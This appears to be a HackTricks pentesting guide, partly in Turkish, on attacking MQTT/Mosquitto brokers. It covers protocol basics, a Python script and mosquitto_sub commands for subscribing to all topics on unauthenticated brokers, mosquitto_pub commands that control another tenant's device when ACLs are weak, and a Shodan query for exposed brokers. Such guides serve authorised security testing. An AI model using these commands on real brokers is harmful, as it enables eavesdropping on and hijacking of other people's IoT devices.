# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

**MQ Telemetry Transport (MQTT)**, son derece basit ve hafif olmasıyla öne çıkan bir **yayın/abone tabanlı mesajlaşma protokolü** olarak bilinir. Bu protokol, cihazların sınırlı yeteneklere sahip olduğu ve düşük bant genişliği, yüksek gecikme veya güvenilmez bağlantılarla karakterize ağlarda çalıştığı ortamlara özel olarak uyarlanmıştır. MQTT'nin temel hedefleri arasında ağ bant genişliği kullanımını en aza indirmek ve cihaz kaynaklarındaki yükü azaltmak yer alır. Ayrıca, güvenilir iletişimi sürdürmeyi ve belirli bir teslimat garantisi düzeyi sağlamayı amaçlar. Bu hedefler, çok sayıda cihazın verimli şekilde bağlanmasının önemli olduğu makine-makine (M2M) iletişimi ve Nesnelerin İnterneti (IoT) alanları için MQTT'yi son derece uygun kılar. Ayrıca, bant genişliğini ve pil ömrünü korumanın önemli olduğu mobil uygulamalar için de MQTT son derece faydalıdır.

**Varsayılan port:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Trafiği İnceleme

When a **CONNECT** packet is received by MQTT brokers, a **CONNACK** packet is sent back. This packet contains a return code which is crucial for understanding the connection status. A return code of **0x00** means that the credentials have been accepted, signifying a successful connection. On the other hand, a return code of **0x05** signals that the credentials are invalid, thus preventing the connection.

For instance, if the broker rejects the connection due to invalid credentials, the scenario would look something like this:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** ve hatta authentication uygulanıyor olsa bile, **encryption varsayılan olarak kullanılmaz** (credentials clear text olarak gönderilir). MITM attacks hâlâ gerçekleştirilebilir ve passwords çalınabilir.

Bir MQTT servisine bağlanmak için şu adresi kullanabilirsiniz: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) ve kendinizi tüm topics'e subscribe ederek:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Ayrıca [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn) kullanabilirsiniz.

Ayrıca şunları da kullanabilirsiniz:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Veya **kimlik doğrulama olmadan bir MQTT servisine bağlanmayı denemek, tüm topic'lere subscribe olup bunları dinlemek için bu kodu çalıştırabilirsiniz**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

Publish/Subscribe modeli şu bileşenlerden oluşur:

- **Publisher**: broker'da bir veya birden fazla topic'e mesaj yayınlar.
- **Subscriber**: broker'daki bir veya birden fazla topic'e abone olur ve publisher tarafından gönderilen tüm mesajları alır.
- **Broker**: publisher'lardan gelen tüm mesajları subscriber'lara yönlendirir.
- **Topic**: eğik çizgi ile ayrılmış bir veya daha fazla seviyeden oluşur (ör. /smartshouse/livingroom/temperature).

### Packet Format <a href="#f15a" id="f15a"></a>

Her MQTT paketi sabit bir başlık içerir (Şekil 02).Şekil 02: Sabit Başlık

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): İstemci tarafından sunucuya bağlantı talep etmek için başlatılır.
- CONNACK (2): Sunucunun başarılı bağlantıyı onaylaması.
- PUBLISH (3): İstemci ile sunucu arasında mesaj göndermek için kullanılır.
- PUBACK (4): Bir PUBLISH paketinin onayı.
- PUBREC (5): Mesaj teslimat protokolünün, mesajın alındığını garanti eden parçası.
- PUBREL (6): Mesaj teslimatında daha fazla güvence sağlayan, mesajın serbest bırakıldığını belirten paket.
- PUBCOMP (7): Mesaj teslimat protokolünün son parçası, tamamlanmayı belirtir.
- SUBSCRIBE (8): Bir istemcinin bir topic'ten mesaj dinleme isteği.
- SUBACK (9): Sunucunun bir SUBSCRIBE isteğini onaylaması.
- UNSUBSCRIBE (10): Bir istemcinin bir topic'ten mesaj almayı bırakma isteği.
- UNSUBACK (11): Sunucunun bir UNSUBSCRIBE isteğine yanıtı.
- PINGREQ (12): İstemci tarafından gönderilen bir heartbeat mesajı.
- PINGRESP (13): Sunucunun heartbeat mesajına yanıtı.
- DISCONNECT (14): Bağlantıyı sonlandırmak için istemci tarafından başlatılır.
- 0 ve 15 olmak üzere iki değer ayrılmış olarak işaretlenmiştir ve kullanımı yasaktır.

## IoT MQTT ekosistem saldırıları: plaintext brokers and topic ACL bypass

Çoğu tüketici IoT platformu, iki farklı rol tarafından kullanılan MQTT broker'larını sunar:
- Gateway/hub cihazları, radyo protokollerini (ör. BLE/LoRa/Zigbee) cloud ile köprüler.
- Mobil uygulamalar veya web backend'leri, “app” topic'leri aracılığıyla cihazları kontrol eder.

pentest sırasında kötüye kullanabileceğiniz yaygın zayıflıklar:

- Düz metin MQTT'nin (plaintext MQTT) MQTTS yerine standart dışı portlarda (ör. TCP/8001 gibi) çalışması. Yolda olan herhangi bir gözlemci kimlik bilgilerini ve kontrol frame'lerini okuyabilir. Olağan dışı portlarda açık metin CONNECT/CONNACK ve SUBSCRIBE/PUBLISH trafiğini tespit etmek için Wireshark kullanın.
- Zayıf veya eksik per-tenant topic ACLs. Eğer topic'ler yalnızca deviceId ile adlandırma alanına sahipse (örn. "/tenantless/<deviceId>/tx"), kimlik doğrulanmış herhangi bir kullanıcı diğer tenant'ların cihazlarına PUBLISH yapabilir.
- Bakım/yönetici topic'leri aracılığıyla hassas veri sızıntısı (örn. konfigürasyon değişikliklerinden sonra Wi‑Fi kimlik bilgilerinin açık metin olarak yayınlanması).

Örnekler (yer tutucuları gerçek değerlerle değiştirin):

Abone olunması potansiyel olarak hassas topic'lere, bilinen topic ön ekleri ve device ID'lerle:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
ACLs zayıf olduğunda tenantlar arası kontrol (başka bir tenant'ın device topic'ine publish etmek):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT'in standart olmayan portlarda düz metin olarak bulunması IoT ortamlarında yaygındır. Broker'ları alternatif portlarda aramayı ve protokol tespiti ile doğrulamayı düşünün.

## Kaynaklar

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
